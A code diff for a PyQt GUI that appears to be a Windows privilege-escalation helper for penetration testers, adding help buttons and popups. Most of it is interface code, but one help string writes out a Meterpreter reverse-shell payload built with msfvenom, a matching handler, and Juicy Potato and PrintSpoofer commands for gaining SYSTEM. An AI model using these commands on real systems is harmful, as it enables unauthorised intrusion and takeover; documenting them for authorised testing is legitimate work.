@@ -94,6 +94,68 @@ class MainWindow(QMainWindow):
         self.main_page.setLayout(main_layout)
         self.stacked_widget.addWidget(self.main_page)
 
+    def show_help_window(self, help_text, help_title_text):
+        self.help_window_popup = QDialog(self)
+        self.help_window_popup.setStyleSheet("background-color: #161219;")        
+        
+        # Create the scroll area
+        self.scroll_area = QScrollArea()
+        self.scroll_area.setWindowIcon(QIcon('/opt/H4D2/Icons/settings_icon.png'))
+        self.scroll_area.setWindowTitle("Help Menu")
+        self.scroll_area.setWidgetResizable(True)
+        self.scroll_area.setWidget(self.help_window_popup)
+
+        # Create the top_spacers and horizontal top_line
+        top_spacer1 = QLabel()
+        top_spacer2 = QLabel()
+        top_line = QFrame()
+        top_line.setFrameShape(QFrame.HLine)
+        top_line.setFrameShadow(QFrame.Sunken)
+       
+        # Add the help text to the popup layout
+        help_title = QLabel(help_title_text)
+        help_title.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+
+        help_label = QLabel(help_text)
+        help_label.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+
+        help_label.setWordWrap(True)
+        self.popup_layout = QVBoxLayout()
+        self.popup_layout.addWidget(help_title)
+        self.popup_layout.addWidget(help_label)
+        self.popup_layout.addStretch()
+
+        # Set the layout for the settings popup
+        self.help_window_popup.setLayout(self.popup_layout)
+        self.scroll_area.resize(500, 600)
+        self.scroll_area.show()
+    
+        # Show the settigns popup
+        self.help_window_popup.exec_()
+        
+    def wpe_0_Scan1_Help_Text(self):
+        help_title_text = "Whoami"
+        help_text = "\ncommand-line tool in Windows used for displaying the current user context and privileges under which the current process is executing" 
+        self.show_help_window(help_text, help_title_text)
+    
+    def wpe_0_Scan2_Help_Text(self):
+        help_title_text = "echo %username%"
+        help_text = "\nThis command is used to display the username of the currently logged-in user in the Windows command prompt"
+        self.show_help_window(help_text, help_title_text)
+
+    def wpe_1_Scan1_Help_Text(self):
+        help_title_text = "whoami /priv"
+        help_text = "\nSeImpersonatePrivilege Enabled - This privilege allows a user to impersonate another user or process, which could be used to bypass access controls or gain unauthorized access to resources\n\nExploit - Juicy Potato\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe\nmsfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST " + self.lhost + ";set LPORT " + self.lport + ";run;\"\nJuicy.Potato.x86.exe -l " + self.lport + " -p C:\path\\to\\shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}\n\nExploit - PrintSpoofer\n.\PrintSpoofer64.exe -i -c cmd.exe"
+        self.show_help_window(help_text, help_title_text)
+
     def show_settings(self):
         self.settings_popup = QDialog(self)
         self.settings_popup.setStyleSheet("background-color: #161219;")        
@@ -6990,10 +7052,24 @@ class MainWindow(QMainWindow):
         self.wpe_0_Scan1_Copy.setStyleSheet(
         "*:hover{background: '#20C20E';}"
         )
-     
+       
+        # wpe_0_Scan1_Help
+        if hasattr(self, 'wpe_0_Scan1_Help'):
+            self.tab4_container_layout.removeWidget(self.wpe_0_Scan1_Help)
+            self.wpe_0_Scan1_Help.deleteLater()
+        self.wpe_0_Scan1_Help = QPushButton()
+        self.wpe_0_Scan1_Help.setIcon(QIcon("/opt/H4D2/Icons/tooltip.png"))
+        self.wpe_0_Scan1_Help.setFixedSize(QSize(20,20))
+        self.wpe_0_Scan1_Help.clicked.connect(self.wpe_0_Scan1_Help_Text)
+        self.wpe_0_Scan1_Help.clicked.connect(self.show_help_window)
+        self.wpe_0_Scan1_Help.setStyleSheet(
+        "*:hover{background: '#20C20E';}"
+        )
+        
         # wpe_0_Scan1 adding Widgets
         label_layout = QHBoxLayout()
         label_layout.addWidget(self.wpe_0_Scan1_Copy)
+        label_layout.addWidget(self.wpe_0_Scan1_Help)
         label_layout.addWidget(self.wpe_0_Scan1)
         self.tab4_container_layout.insertLayout(3, label_layout)
         self.tab4_container_layout.addStretch()
@@ -7062,10 +7138,24 @@ class MainWindow(QMainWindow):
         self.wpe_0_Scan2_Copy.setStyleSheet(
         "*:hover{background: '#20C20E';}"
         )
-     
+        
+        # wpe_0_Scan2_Help
+        if hasattr(self, 'wpe_0_Scan2_Help'):
+            self.tab4_container_layout.removeWidget(self.wpe_0_Scan2_Help)
+            self.wpe_0_Scan2_Help.deleteLater()
+        self.wpe_0_Scan2_Help = QPushButton()
+        self.wpe_0_Scan2_Help.setIcon(QIcon("/opt/H4D2/Icons/tooltip.png"))
+        self.wpe_0_Scan2_Help.setFixedSize(QSize(20,20))
+        self.wpe_0_Scan2_Help.clicked.connect(self.wpe_0_Scan2_Help_Text)
+        self.wpe_0_Scan2_Help.clicked.connect(self.show_help_window)
+        self.wpe_0_Scan2_Help.setStyleSheet(
+        "*:hover{background: '#20C20E';}"
+        )
+
         # wpe_0_Scan2 adding Widgets
         label_layout = QHBoxLayout()
         label_layout.addWidget(self.wpe_0_Scan2_Copy)
+        label_layout.addWidget(self.wpe_0_Scan2_Help)
         label_layout.addWidget(self.wpe_0_Scan2)
         self.tab4_container_layout.insertLayout(9, label_layout)
         self.tab4_container_layout.addStretch()
@@ -7147,9 +7237,23 @@ class MainWindow(QMainWindow):
         "*:hover{background: '#20C20E';}"
         )
      
+        # wpe_1_Scan1_Help
+        if hasattr(self, 'wpe_1_Scan1_Help'):
+            self.tab4_container_layout.removeWidget(self.wpe_1_Scan1_Help)
+            self.wpe_1_Scan1_Help.deleteLater()
+        self.wpe_1_Scan1_Help = QPushButton()
+        self.wpe_1_Scan1_Help.setIcon(QIcon("/opt/H4D2/Icons/tooltip.png"))
+        self.wpe_1_Scan1_Help.setFixedSize(QSize(20,20))
+        self.wpe_1_Scan1_Help.clicked.connect(self.wpe_1_Scan1_Help_Text)
+        self.wpe_1_Scan1_Help.clicked.connect(self.show_help_window)
+        self.wpe_1_Scan1_Help.setStyleSheet(
+        "*:hover{background: '#20C20E';}"
+        )
+
         # wpe_1_Scan1 adding Widgets
         label_layout = QHBoxLayout()
         label_layout.addWidget(self.wpe_1_Scan1_Copy)
+        label_layout.addWidget(self.wpe_1_Scan1_Help)
         label_layout.addWidget(self.wpe_1_Scan1)
         self.tab4_container_layout.insertLayout(16, label_layout)
         self.tab4_container_layout.addStretch()
